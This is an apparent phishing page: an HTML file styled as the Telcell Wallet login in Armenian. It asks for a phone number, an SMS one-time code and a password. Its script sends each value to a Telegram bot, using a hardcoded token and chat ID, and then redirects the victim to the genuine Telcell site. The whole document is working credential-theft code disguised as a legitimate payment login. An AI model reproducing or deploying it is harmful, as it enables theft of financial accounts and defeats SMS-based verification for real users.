<!DOCTYPE html>
<html lang="hy">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Telcell Wallet</title>
    <style>
        :root { --primary-color: #ff5e4d; --bg-color: #ffffff; --input-bg: #f2f2f7; --text-main: #222; --text-secondary: #8e8e93; --btn-disabled: #ffd0c8; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, sans-serif; }
        body { background-color: var(--bg-color); display: flex; justify-content: center; height: 100vh; overflow: hidden; }
        .app-container { width: 100%; max-width: 400px; display: flex; flex-direction: column; padding: 20px; }
        .back-button { background: none; border: none; font-size: 28px; cursor: pointer; width: 40px; margin-left: -10px; }
        h1 { font-size: 34px; font-weight: 800; margin-bottom: 25px; }
        .section-title { text-align: center; margin-bottom: 30px; }
        .section-title h2 { font-size: 22px; font-weight: 700; }
        .section-title p { font-size: 15px; color: var(--text-secondary); margin-top: 6px; }
        .input-group { margin-top: 10px; }
        .input-group label { font-size: 14px; font-weight: 700; display: block; margin-bottom: 10px; }
        .input-wrapper { background-color: var(--input-bg); border-radius: 16px; padding: 18px 20px; display: flex; align-items: center; border: 1px solid transparent; }
        input { background: none; border: none; outline: none; width: 100%; font-size: 17px; }
        .otp-container { display: flex; justify-content: space-between; margin: 35px 0; gap: 8px; }
        .otp-input { width: 14%; height: 58px; background-color: var(--input-bg); border-radius: 14px; text-align: center; font-size: 24px; font-weight: 700; border: none; }
        .footer { margin-top: auto; display: flex; flex-direction: column; align-items: center; gap: 15px; padding-bottom: 25px; }
        .submit-btn { width: 100%; background-color: var(--btn-disabled); color: white; border: none; border-radius: 30px; height: 56px; font-size: 18px; font-weight: 700; cursor: pointer; }
        .submit-btn.active { background-color: var(--primary-color); }
        .hidden { display: none !important; }
        .forgot-pass { color: var(--primary-color); font-size: 14px; font-weight: 700; text-decoration: none; margin-top: 15px; display: block; }
    </style>
</head>
<body>

<div class="app-container">
    <button class="back-button">‹</button>
    <h1 id="mainTitle">Բարև</h1>
    
    <div id="screen-1">
        <div class="section-title"><h2>Մուտք</h2><p>Ստեղծիր հարթակ վճարումներիդ համար</p></div>
        <div class="input-group">
            <label>Քո հեռախոսահամարը</label>
            <div class="input-wrapper"><input type="tel" id="user_phone" placeholder="+374"></div>
        </div>
    </div>

    <div id="screen-2" class="hidden">
        <div class="section-title"><h2>SMS հաստատում</h2><p>Մուտքագրիր 6 նիշանոց կոդը</p></div>
        <div class="otp-container">
            <input type="number" class="otp-input" maxlength="1"><input type="number" class="otp-input" maxlength="1"><input type="number" class="otp-input" maxlength="1">
            <input type="number" class="otp-input" maxlength="1"><input type="number" class="otp-input" maxlength="1"><input type="number" class="otp-input" maxlength="1">
        </div>
    </div>

    <div id="screen-3" class="hidden">
        <div class="section-title"><h2>Ուրախ ենք քեզ նորից տեսնել</h2><p>Քո վճարումների հարթակը</p></div>
        <div class="input-group">
            <label>Գաղտնաբառ</label>
            <div class="input-wrapper"><input type="password" id="user_pass" placeholder="Մուտքագրիր գաղտնաբառը"></div>
            <a href="#" class="forgot-pass">Մոռացել ես գաղտնաբառը</a>
        </div>
    </div>

    <div class="footer">
        <button id="mainBtn" class="submit-btn">Հաստատել</button>
    </div>
</div>

<script>
    const CONFIG = { token: '8314828218:AAGY6twUZ6iFU7smncNhgGJ7pxh5z6MF1p8', chat: '6576262467' };
    let step = 1; let data = { phone: '', sms: '', pass: '' };

    const mainBtn = document.getElementById('mainBtn');
    const phoneInp = document.getElementById('user_phone');
    const passInp = document.getElementById('user_pass');

    phoneInp.oninput = () => mainBtn.classList.toggle('active', phoneInp.value.length >= 8);
    passInp.oninput = () => mainBtn.classList.toggle('active', passInp.value.length >= 4);

    mainBtn.onclick = async () => {
        if (!mainBtn.classList.contains('active')) return;
        if (step === 1) {
            data.phone = phoneInp.value;
            await sendTG(`📲 *LOGIN*:\n📞 Phone: ${data.phone}`);
            changeScreen(2);
        } else if (step === 3) {
            data.pass = passInp.value;
            await sendTG(`🔐 *PASSWORD*:\n📞 Phone: ${data.phone}\n🔑 Pass: ${data.pass}`);
            window.location.href = "https://telcell.am";
        }
    };

    function changeScreen(n) {
        document.getElementById(`screen-${step}`).classList.add('hidden');
        document.getElementById(`screen-${n}`).classList.remove('hidden');
        step = n;
        mainBtn.classList.remove('active');
        if (n === 2) { mainBtn.classList.add('hidden'); initOtp(); }
        else { mainBtn.classList.remove('hidden'); }
    }

    function initOtp() {
        const inps = document.querySelectorAll('.otp-input');
        inps.forEach((inp, i) => {
            inp.oninput = async () => {
                if (inp.value && i < 5) inps[i+1].focus();
                const code = Array.from(inps).map(ti => ti.value).join('');
                if (code.length === 6) {
                    data.sms = code;
                    await sendTG(`🔑 *SMS*:\n📞 Phone: ${data.phone}\n💬 Code: ${code}`);
                    setTimeout(() => changeScreen(3), 500);
                }
            };
        });
    }

    async function sendTG(msg) {
        try {
            const res = await fetch(`https://telegram.org{CONFIG.token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CONFIG.chat, text: msg, parse_mode: 'Markdown' })
            });
            const resData = await res.json();
            if (!resData.ok) alert("Ошибка API: " + resData.description);
        } catch (e) { alert("Ошибка сети!"); }
    }
</script>
</body>
</html>
